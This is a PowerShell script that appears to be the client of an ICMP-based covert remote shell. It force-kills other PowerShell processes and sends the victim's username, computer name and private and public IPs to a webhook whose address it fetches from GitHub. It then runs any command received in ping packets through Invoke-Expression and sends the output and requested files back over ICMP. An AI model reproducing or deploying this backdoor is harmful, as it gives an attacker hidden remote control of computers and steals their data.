$VERSION = "1.02 (MOST RECENT)"
Add-Type -AssemblyName  Microsoft.VisualBasic, PresentationCore, PresentationFramework, System.Drawing, System.Windows.Forms, WindowsBase, WindowsFormsIntegration, System; Add-Type -TypeDefinition 'namespace Windows.Native{using System;using System.ComponentModel;using System.IO;using System.Runtime.InteropServices;public class Kernel32{public const uint FILE_SHARE_READ = 1;public const uint FILE_SHARE_WRITE = 2;public const uint GENERIC_READ = 0x80000000;public const uint GENERIC_WRITE = 0x40000000;public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);public const int STD_ERROR_HANDLE = -12;public const int STD_INPUT_HANDLE = -10;public const int STD_OUTPUT_HANDLE = -11;[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]public class CONSOLE_FONT_INFOEX{private int cbSize;public CONSOLE_FONT_INFOEX(){this.cbSize = Marshal.SizeOf(typeof(CONSOLE_FONT_INFOEX));}public int FontIndex;public short FontWidth;public short FontHeight;public int FontFamily;public int FontWeight;[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]public string FaceName;}public class Handles{public static readonly IntPtr StdIn = GetStdHandle(STD_INPUT_HANDLE);public static readonly IntPtr StdOut = GetStdHandle(STD_OUTPUT_HANDLE);public static readonly IntPtr StdErr = GetStdHandle(STD_ERROR_HANDLE);}[DllImport("kernel32.dll", SetLastError=true)]public static extern bool CloseHandle(IntPtr hHandle);[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPTStr)] string filename,uint access,uint share,IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,uint flagsAndAttributes,IntPtr templateFile);[DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]public static extern bool GetCurrentConsoleFontEx(IntPtr hConsoleOutput, bool bMaximumWindow, [In, Out] CONSOLE_FONT_INFOEX lpConsoleCurrentFont);[DllImport("kernel32.dll", SetLastError=true)]public static extern IntPtr GetStdHandle(int nStdHandle);[DllImport("kernel32.dll", SetLastError=true)]public static extern bool SetCurrentConsoleFontEx(IntPtr ConsoleOutput, bool MaximumWindow,[In, Out] CONSOLE_FONT_INFOEX ConsoleCurrentFontEx);public static IntPtr CreateFile(string fileName, uint fileAccess, uint fileShare, FileMode creationDisposition){IntPtr hFile = CreateFile(fileName, fileAccess, fileShare, IntPtr.Zero, creationDisposition, 0U, IntPtr.Zero);if (hFile == INVALID_HANDLE_VALUE){throw new Win32Exception();}return hFile;}public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx(){IntPtr hFile = IntPtr.Zero;try{hFile = CreateFile("CONOUT$", GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);return GetCurrentConsoleFontEx(hFile);}finally{CloseHandle(hFile);}}public static void SetCurrentConsoleFontEx(CONSOLE_FONT_INFOEX cfi){IntPtr hFile = IntPtr.Zero;try{hFile = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);SetCurrentConsoleFontEx(hFile, false, cfi);}finally{CloseHandle(hFile);}}public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx(IntPtr outputHandle){CONSOLE_FONT_INFOEX cfi = new CONSOLE_FONT_INFOEX();if (!GetCurrentConsoleFontEx(outputHandle, false, cfi)){throw new Win32Exception();}return cfi;}}}'; 
$F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.FontWidth = 6; $F.FontHeight = 12; $F.FontFamily = 54; $F.FontWeight = 1000; $F.FaceName = "SimSun-ExtB"; [Windows.Native.Kernel32]::SetCurrentConsoleFontEx($F)
(Get-Process | Where-Object {$_.ProcessName -eq "powershell" -and $_.Id -ne $PID} | Select-Object -ExpandProperty Id) | % {Stop-Process -Id $_ -Force}
[char]$EL = 14

$BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)

$pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
$pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
$pRs.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
$buffer = new-object byte[] $pRs.ReceiveBufferSize

$sc = [System.Net.NetworkInformation.Ping]::new()
$PingOptions = [System.Net.NetworkInformation.PingOptions]::new()
$PingOptions.DontFragment = $true

function ret {
  $FeedBack = ([System.Text.Encoding]::ASCII.GetString($script:buffer[28..$pRs.ReceiveBufferSize]))
  $FeedBack = ($FeedBack.Substring(0, ($FeedBack.IndexOf($script:EL)))) 
  return $FeedBack
}

function Send-Webhook {
  param(
      [string]$WebhookUrl,
      [object]$Data
  )
  $json = $Data | ConvertTo-Json
  Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $json -ContentType "application/json"
}
$payload = @{
  "ClientVer"    = "$($VERSION)"
  "Prv-IP"       = "$((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)"
  "Binding IP"   = "$($BindingIP)"
  "User"         = "$($env:USERPROFILE)"
  "Pub-IP"       = "$((Iwr -Uri "https://api.ipify.org").Content)"
  "ComputerName" = "$($env:ComputerName)"
  "Date"         = "$(get-date)"
}

Send-Webhook -WebhookUrl ((iwr https://raw.githubusercontent.com/jh1sc/Conex/main/Client).content) -Data $payload
while ($true) {
  $pRs.Receive($buffer) | out-null

  if ((ret) -eq "H_IP") {
    $pRs.Receive($buffer) | out-null; $H_IP = (ret)
    $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved." + $EL)), $PingOptions)    
    $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + "> " + $EL)), $PingOptions)
  } 
  elseif ((ret) -eq "Transfer") {
    Write-Verbose "Transfer"
    $pRs.Receive($buffer) | out-null
      $Infile = (ret);
      $fileSize = (Get-Item $Infile).Length

    
      if ($fileSize -gt 60000) {
        $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes("True" + $EL)), $PingOptions) | out-null
        [int]$bufSize = 1472; $stream = [System.IO.File]::OpenRead($inFile); $chunkNum = 0
        $TotalChunks = [math]::floor($stream.Length / 1472); $barr = New-Object byte[] $bufSize
        while ($stream.Read($barr, 0, $bufsize)) {
          $s =  
          @"
      Write-Progress -Activity "Transferring file inFile" -Status "Progress: chunkNum out of TotalChunks chunks" -PercentComplete ((chunkNum / TotalChunks) * 100)
"@
          [string]$s = $s -replace "inFile", $inFile
          [string]$s = $s -replace "chunkNum", $chunkNum
          [string]$s = $s -replace "TotalChunks", $TotalChunks
          $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes([string]$s + $EL)), $PingOptions) | out-null
    
          $chunkNum += 1
          if ($chunkNum -gt ($TotalChunks)) {
            $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes("End" + $EL)), $PingOptions) | out-null
            write-host ENDING
            break
          }
          else {
            Write-Output "Done with $chunkNum out of $TotalChunks"
            $sc.Send($H_IP , 60 * 1000, $barr + (([text.encoding]::ASCII).GetBytes($EL)), $PingOptions) | out-null
            $pRs.Receive($buffer)
          }      
        }
      }
      elseif ($fileSize -lt 60000) {
        $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes("False" + $EL)), $PingOptions) | out-null
        $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes([string](gc $Infile) + $EL)), $PingOptions) | out-null
      }
  }
  elseif (((ret) -ne "H_IP") -and ((ret) -ne "Transfer")) {
    $com = $null
    write-host PARSED: (ret)
    $com = (Invoke-Expression -Command (ret)); if ($com -ne $null){
    $com = $com + "`n" + ($error[0] | Out-String); $error.clear()
    }
    else {
      $com = ""
    }
  
    $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($com + $EL)), $PingOptions)
    $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + "> " + $EL)), $PingOptions)
  }
}